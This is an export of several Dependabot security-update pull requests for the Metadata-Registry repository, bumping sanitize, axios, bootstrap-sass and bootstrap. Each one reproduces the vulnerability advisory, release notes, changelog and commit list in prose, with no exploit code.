<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p4x4-rw2p-8j8m"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Cross-site Scripting in Sanitize</strong>
When HTML is sanitized using Sanitize's &quot;relaxed&quot; config or a custom config that allows certain elements, some content in a <code>or</code> element may not be sanitized correctly even if <code>math</code> and <code>svg</code> are not in the allowlist.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<h3>Impact</h3>
<p>Using carefully crafted input, an attacker may be able to sneak arbitrary HTML through Sanitize, potentially resulting in XSS (cross-site scripting) or other undesired behavior when that HTML is rendered in a browser.</p>
<h3>Releases</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Affected versions: &gt;= 3.0.0, &lt; 5.2.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/rgrove/sanitize/releases"">sanitize's releases</a>.</em></p>
<blockquote>
<h2>v5.2.3</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Ensure protocol sanitization is applied to data attributes. [<a href=""https://github.com/ccutrer""><code>@ccutrer</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/207"">#207</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/207"">207</a></li>
</ul>
<h2>v5.2.2</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Fixed a deprecation warning in Ruby 2.7+ when using keyword arguments in a custom transformer. [<a href=""https://github.com/mscrivo""><code>@mscrivo</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/206"">#206</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/206"">206</a></li>
</ul>
<h2>v5.2.1</h2>
<h3>Bug Fixes</h3>
<ul>
<li>
<p>Fixed an HTML sanitization bypass that could allow XSS. This issue affects Sanitize versions 3.0.0 through 5.2.0.</p>
<p>When HTML was sanitized using the &quot;relaxed&quot; config or a custom config that allows certain elements, some content in a <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element may not have beeen sanitized correctly even if <code>math</code> and <code>svg</code> were not in the allowlist. This could allow carefully crafted input to sneak arbitrary HTML through Sanitize, potentially enabling an XSS (cross-site scripting) attack.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<p>See the security advisory for more details, including a workaround if you're not able to upgrade: <a href=""https://github.com/rgrove/sanitize/security/advisories/GHSA-p4x4-rw2p-8j8m"">GHSA-p4x4-rw2p-8j8m</a></p>
<p>Many thanks to MichaÅ‚ Bentkowski of Securitum for reporting this issue and helping to verify the fix.</p>
</li>
</ul>
<h2>v5.2.0</h2>
<h3>Changes</h3>
<ul>
<li>
<p>The term &quot;whitelist&quot; has been replaced with &quot;allowlist&quot; throughout Sanitize's source and documentation.</p>
<p>While the etymology of &quot;whitelist&quot; may not be explicitly racist in origin or intent, there are inherent racial connotations in the implication that white is good and black (as in &quot;blacklist&quot;) is not.</p>
<p>This is a change I should have made long ago, and I apologize for not making it sooner.</p>
</li>
<li>
<p>In transformer input, the <code>:is_whitelisted</code> and <code>:node_whitelist</code> keys are now deprecated. New <code>:is_allowlisted</code> and <code>:node_allowlist</code> keys have been added. The old keys will continue to work in order to avoid breaking existing code, but they are no longer documented and may be removed in a future semver major release.</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/rgrove/sanitize/blob/master/HISTORY.md"">sanitize's changelog</a>.</em></p>
<blockquote>
<h2>5.2.3 (2021-01-11)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Ensure protocol sanitization is applied to data attributes.
[<a href=""https://github.com/ccutrer""><code>@ccutrer</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/207"">#207</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/207"">207</a></li>
</ul>
<h2>5.2.2 (2021-01-06)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>Fixed a deprecation warning in Ruby 2.7+ when using keyword arguments in a
custom transformer. [<a href=""https://github.com/mscrivo""><code>@mscrivo</code></a> - <a href=""https://github-redirect.dependabot.com/rgrove/sanitize/issues/206"">#206</a>]<a href=""https://github-redirect.dependabot.com/rgrove/sanitize/pull/206"">206</a></li>
</ul>
<h2>5.2.1 (2020-06-16)</h2>
<h3>Bug Fixes</h3>
<ul>
<li>
<p>Fixed an HTML sanitization bypass that could allow XSS. This issue affects
Sanitize versions 3.0.0 through 5.2.0.</p>
<p>When HTML was sanitized using the &quot;relaxed&quot; config or a custom config that
allows certain elements, some content in a <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element may not
have beeen sanitized correctly even if <code>math</code> and <code>svg</code> were not in the
allowlist. This could allow carefully crafted input to sneak arbitrary HTML
through Sanitize, potentially enabling an XSS (cross-site scripting) attack.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed
config or a custom config that allows one or more of the following HTML
elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<p>See the security advisory for more details, including a workaround if you're
not able to upgrade: [GHSA-p4x4-rw2p-8j8m]</p>
<p>Many thanks to MichaÅ‚ Bentkowski of Securitum for reporting this issue and</p>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/rgrove/sanitize/commit/9b8b55b6b90895a232f4243eaf5a4e6454136e20""><code>9b8b55b</code></a> Release 5.2.3</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/eaaaa9d1dd3714c8467b9169edf2ecd1e2a3e277""><code>eaaaa9d</code></a> Clarify comments</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/fac1a2ea3750630d5cb482b9c19fdac703356580""><code>fac1a2e</code></a> ensure protocol processing happens on data attributes</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/4f6858ff9f6e3e7ed6d0fba85a2a8fd1d37594df""><code>4f6858f</code></a> Link the Tests badge to the workflow page</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/1c661dc15ad5872f07988e5aced68c68a328c099""><code>1c661dc</code></a> Remove Travis</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/cd68389b041405e47bc5c400ea5c0c63cd5786da""><code>cd68389</code></a> Add GitHub Actions workflow</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/4ea3d8ec48563f19c0927153ae1217fd9aa3d962""><code>4ea3d8e</code></a> Release 5.2.2</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/7a7dd3ed42145de137cee2c987d1667ce428837f""><code>7a7dd3e</code></a> Add Ruby 3.0 to the Travis matrix.</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/361cc0515aea77de9905140f6fc2546812b5dc05""><code>361cc05</code></a> Fix warning in Ruby 2.7+</li>
<li><a href=""https://github.com/rgrove/sanitize/commit/b032474dbc5a567e41c12d8481e8d4265b51588e""><code>b032474</code></a> Merge branch 'ajmalmsali-patch-1'</li>
<li>Additional commits viewable in <a href=""https://github.com/rgrove/sanitize/compare/v4.6.4...v5.2.3"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=sanitize&package-manager=bundler&previous-version=4.6.4&new-version=5.2.3)](https://dependabot.com/compatibility-score/?dependency-name=sanitize&package-manager=bundler&previous-version=4.6.4&new-version=5.2.3)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Automerge options (never/patch/minor, and dev/runtime dependencies)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"security,dependencies,"
jonphipps/Metadata-Registry,772832761,"[Security] Bump axios from 0.17.1 to 0.21.1","Bumps [axios](https://github.com/axios/axios) from 0.17.1 to 0.21.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>High severity vulnerability that affects axios</strong>
Axios up to and including 0.18.0 allows attackers to cause a denial of service (application crash) by continuing to accepting content after maxContentLength is exceeded.</p>
<p>Affected versions: &lt;= 0.18.0</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/axios/axios/releases"">axios's releases</a>.</em></p>
<blockquote>
<h2>v0.21.0</h2>
<h3>0.21.0 (October 23, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing requestHeaders.Authorization (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3287"">#3287</a>)</li>
<li>Fixing node types (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3237"">#3237</a>)</li>
<li>Fixing axios.delete ignores config.data (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3282"">#3282</a>)</li>
<li>Revert &quot;Fixing overwrite Blob/File type as Content-Type in browser. (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/1773"">#1773</a>)&quot; (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3289"">#3289</a>)</li>
<li>Fixing an issue that type 'null' and 'undefined' is not assignable to validateStatus when typescript strict option is enabled (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3200"">#3200</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Lock travis to not use node v15 (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3361"">#3361</a>)</li>
</ul>
<p>Documentation:</p>
<ul>
<li>Fixing simple typo, existant -&gt; existent (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3252"">#3252</a>)</li>
<li>Fixing typos (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3309"">#3309</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Allan Cruz <a href=""mailto:57270969+Allanbcruz@users.noreply.github.com"">57270969+Allanbcruz@users.noreply.github.com</a></li>
<li>George Cheng <a href=""mailto:Gerhut@GMail.com"">Gerhut@GMail.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Kevin Kirsche <a href=""mailto:Kev.Kirsche+GitHub@gmail.com"">Kev.Kirsche+GitHub@gmail.com</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Taemin Shin <a href=""mailto:cprayer13@gmail.com"">cprayer13@gmail.com</a></li>
<li>Tim Gates <a href=""mailto:tim.gates@iress.com"">tim.gates@iress.com</a></li>
<li>Xianming Zhong <a href=""mailto:chinesedfan@qq.com"">chinesedfan@qq.com</a></li>
</ul>
<h2>v0.20.0</h2>
<p>Release of 0.20.0-pre as a full release with no other changes.</p>
<h2>v0.20.0-0</h2>
<h3>0.20.0-pre (July 15, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing response with utf-8 BOM can not parse to json (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/2419"">#2419</a>)
<ul>
<li>fix: remove byte order marker (UTF-8 BOM) when transform response</li>
<li>fix: remove BOM only utf-8</li>
<li>test: utf-8 BOM</li>
<li>fix: incorrect param name</li>
</ul>
</li>
<li>Refactor mergeConfig without utils.deepMerge (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/2844"">#2844</a>)
<ul>
<li>Adding failing test</li>
<li>Fixing <a href=""https://github-redirect.dependabot.com/axios/axios/issues/2587"">#2587</a> default custom config persisting</li>
<li>Adding Concat keys and filter duplicates</li>
<li>Fixed value from CPE</li>
<li>update for review feedbacks</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/axios/axios/blob/v0.21.1/CHANGELOG.md"">axios's changelog</a>.</em></p>
<blockquote>
<h3>0.21.1 (December 21, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Hotfix: Prevent SSRF (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3410"">#3410</a>)</li>
<li>Protocol not parsed when setting proxy config from env vars (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3070"">#3070</a>)</li>
<li>Updating axios in types to be lower case (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2797"">#2797</a>)</li>
<li>Adding a type guard for <code>AxiosError</code> (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2949"">#2949</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Remove the skipping of the <code>socket</code> http test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3364"">#3364</a>)</li>
<li>Use different socket for Win32 test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3375"">#3375</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Daniel Lopretto <a href=""mailto:timemachine3030@users.noreply.github.com"">timemachine3030@users.noreply.github.com</a></li>
<li>Jason Kwok <a href=""mailto:JasonHK@users.noreply.github.com"">JasonHK@users.noreply.github.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Jonathan Foster <a href=""mailto:jonathan@jonathanfoster.io"">jonathan@jonathanfoster.io</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Xianming Zhong <a href=""mailto:chinesedfan@qq.com"">chinesedfan@qq.com</a></li>
</ul>
<h3>0.21.0 (October 23, 2020)</h3>
<p>Fixes and Functionality:</p>
<ul>
<li>Fixing requestHeaders.Authorization (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3287"">#3287</a>)</li>
<li>Fixing node types (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3237"">#3237</a>)</li>
<li>Fixing axios.delete ignores config.data (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3282"">#3282</a>)</li>
<li>Revert &quot;Fixing overwrite Blob/File type as Content-Type in browser. (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/1773"">#1773</a>)&quot; (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3289"">#3289</a>)</li>
<li>Fixing an issue that type 'null' and 'undefined' is not assignable to validateStatus when typescript strict option is enabled (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3200"">#3200</a>)</li>
</ul>
<p>Internal and Tests:</p>
<ul>
<li>Lock travis to not use node v15 (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3361"">#3361</a>)</li>
</ul>
<p>Documentation:</p>
<ul>
<li>Fixing simple typo, existant -&gt; existent (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3252"">#3252</a>)</li>
<li>Fixing typos (<a href=""https://github-redirect.dependabot.com/axios/axios/pull/3309"">#3309</a>)</li>
</ul>
<p>Huge thanks to everyone who contributed to this release via code (authors listed below) or via reviews and triaging on GitHub:</p>
<ul>
<li>Allan Cruz <a href=""mailto:57270969+Allanbcruz@users.noreply.github.com"">57270969+Allanbcruz@users.noreply.github.com</a></li>
<li>George Cheng <a href=""mailto:Gerhut@GMail.com"">Gerhut@GMail.com</a></li>
<li>Jay <a href=""mailto:jasonsaayman@gmail.com"">jasonsaayman@gmail.com</a></li>
<li>Kevin Kirsche <a href=""mailto:Kev.Kirsche+GitHub@gmail.com"">Kev.Kirsche+GitHub@gmail.com</a></li>
<li>Remco Haszing <a href=""mailto:remcohaszing@gmail.com"">remcohaszing@gmail.com</a></li>
<li>Taemin Shin <a href=""mailto:cprayer13@gmail.com"">cprayer13@gmail.com</a></li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/axios/axios/commit/a64050a6cfbcc708a55a7dc8030d85b1c78cdf38""><code>a64050a</code></a> Releasing 0.21.1</li>
<li><a href=""https://github.com/axios/axios/commit/d57cd976f3cc0f1c5bb1f0681660e50004781db5""><code>d57cd97</code></a> Updating changelog for 0.21.1 release</li>
<li><a href=""https://github.com/axios/axios/commit/8b0f373df0574b7cb3c6b531b4092cd670dac6e3""><code>8b0f373</code></a> Use different socket for Win32 test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3375"">#3375</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/e426910be7c417bdbcde9c18cb184ead826fc0e1""><code>e426910</code></a> Protocol not parsed when setting proxy config from env vars (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3070"">#3070</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/c7329fefc890050edd51e40e469a154d0117fc55""><code>c7329fe</code></a> Hotfix: Prevent SSRF (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3410"">#3410</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/f472e5da5fe76c72db703d6a0f5190e4ad31e642""><code>f472e5d</code></a> Adding a type guard for <code>AxiosError</code> (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2949"">#2949</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/768825589fd0d36b64a66717ca6df2efd8fb7844""><code>7688255</code></a> Remove the skipping of the <code>socket</code> http test (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/3364"">#3364</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/820fe6e41a96f05fb4781673ce07486f1b37515d""><code>820fe6e</code></a> Updating axios in types to be lower case (<a href=""https://github-redirect.dependabot.com/axios/axios/issues/2797"">#2797</a>)</li>
<li><a href=""https://github.com/axios/axios/commit/94ca24b5b23f343769a15f325693246e07c177d2""><code>94ca24b</code></a> Releasing 0.21.0</li>
<li><a href=""https://github.com/axios/axios/commit/2130a0c8acc588c72b53dfef31a11442043ffb06""><code>2130a0c</code></a> Updating changelog for 0.21.0 release</li>
<li>Additional commits viewable in <a href=""https://github.com/axios/axios/compare/v0.17.1...v0.21.1"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
<p>This version was pushed to npm by <a href=""https://www.npmjs.com/~emilyemorehouse"">emilyemorehouse</a>, a new releaser for axios since your current version.</p>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=axios&package-manager=npm_and_yarn&previous-version=0.17.1&new-version=0.21.1)](https://dependabot.com/compatibility-score/?dependency-name=axios&package-manager=npm_and_yarn&previous-version=0.17.1&new-version=0.21.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,579167698,"[Security] Bump bootstrap-sass from 3.3.7 to 3.4.1","Bumps [bootstrap-sass](https://github.com/twbs/bootstrap-sass) from 3.3.7 to 3.4.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap and bootstrap-sass</strong>
In Bootstrap 4 before 4.3.1 and Bootstrap 3 before 3.4.1, XSS is possible in the tooltip or popover data-template attribute. For more information, see: <a href=""https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/"">https://blog.getbootstrap.com/2019/02/13/bootstrap-4-3-1-and-3-4-1/</a></p>
<p>Affected versions: &gt;= 3.0.0 &lt; 3.4.1</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap-sass/releases"">bootstrap-sass's releases</a>.</em></p>
<blockquote>
<h2>v3.4.1</h2>
<ul>
<li><strong>Security:</strong> Fixed an XSS vulnerability (CVE-2019-8331) in our tooltip and popover plugins by implementing a new HTML sanitizer</li>
<li>Handle bad selectors (<code>#</code>) in <code>data-target</code> for Dropdowns</li>
<li>Clarified tooltip selector documentation</li>
<li>Added support for NuGet contentFiles</li>
</ul>
<h2>v3.4.0</h2>
<ul>
<li><strong>New</strong>: Added a .row-no-gutters class.</li>
<li><strong>New</strong>: Added docs searching via Algolia.</li>
<li><strong>Fixed</strong>: Resolved an XSS issue in Alert, Carousel, Collapse, Dropdown, Modal, and Tab components. See <a href=""https://snyk.io/vuln/npm:bootstrap:20160627"">https://snyk.io/vuln/npm:bootstrap:20160627</a> for details.</li>
<li><strong>Fixed</strong>: Added padding to .navbar-fixed-* on modal open</li>
<li><strong>Fixed</strong>: Removed the double border on <abbr> elements.</li>
<li><strong>Removed</strong> Gist creation in web-based Customizer since anonymous gists were disabled long ago by GitHub.</li>
<li><strong>Removed</strong> drag and drop support from Customizer since it didnâ€™t work anymore.</li>
</ul>
<p>Framework version: Bootstrap <strong>v3.4.0</strong>
See <a href=""http://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"">the upstream blog post</a> for a detailed overview.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/twbs/bootstrap-sass/blob/master/CHANGELOG.md"">bootstrap-sass's changelog</a>.</em></p>
<blockquote>
<h1>Changelog</h1>
<h2>3.4.0</h2>
<ul>
<li>Bootstrap rubygem now depends on SassC instead of Sass.</li>
<li>Compass no longer supported.</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/b34765d8a6aa775816c59012b2d6b30c4c66a8e9""><code>b34765d</code></a> Rakefile: require 'bundler/gem_tasks'</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/143aa6ad684f0e990ea93ce8ff788427e52df1b5""><code>143aa6a</code></a> Bump bootstrap-sass to 3.4.1</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/69157ce76df1ccff394803811e582979cda4a993""><code>69157ce</code></a> rake convert[v3.4.1]</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/bb7dbf8af72b455b51936bc07e51efcaf6220bcc""><code>bb7dbf8</code></a> v3.4.0</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/3c126b3d9616bc07b6d976f8aee7ad662bd8013a""><code>3c126b3</code></a> Revert relative imports change</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/dcdef9bfd81a9821d775417dbdab4c5df3553ba2""><code>dcdef9b</code></a> Test Rails app: Depend on sassc-rails</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/cd1542b34577e36c8e80b4e258fceb742b2e26ad""><code>cd1542b</code></a> rake convert[v3.4.0]</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/07b9b642d4a189478290dd7dfbf5e2dbe239bf84""><code>07b9b64</code></a> less_conversion.rb: Update stylelint comment removal</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/6634d0a18a14046eb19c7b941be17d7a195604ca""><code>6634d0a</code></a> Remove compass support</li>
<li><a href=""https://github.com/twbs/bootstrap-sass/commit/489b6f2b809ad87c1d77ea6dcca1d7b0d24419bc""><code>489b6f2</code></a> lotus -&gt; hanami</li>
<li>Additional commits viewable in <a href=""https://github.com/twbs/bootstrap-sass/compare/v3.3.7...v3.4.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=bootstrap-sass&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=3.4.1)](https://dependabot.com/compatibility-score/?dependency-name=bootstrap-sass&package-manager=npm_and_yarn&previous-version=3.3.7&new-version=3.4.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,javascript,security,"
jonphipps/Metadata-Registry,577814856,"[Security] Bump bootstrap from 3.3.7 to 4.1.2","Bumps [bootstrap](https://github.com/twbs/bootstrap) from 3.3.7 to 4.1.2. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects bootstrap</strong>
In Bootstrap before 4.1.2, XSS is possible in the data-target property of scrollspy. This is similar to CVE-2018-14042.</p>
<p>Affected versions: &lt; 3.4.0</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
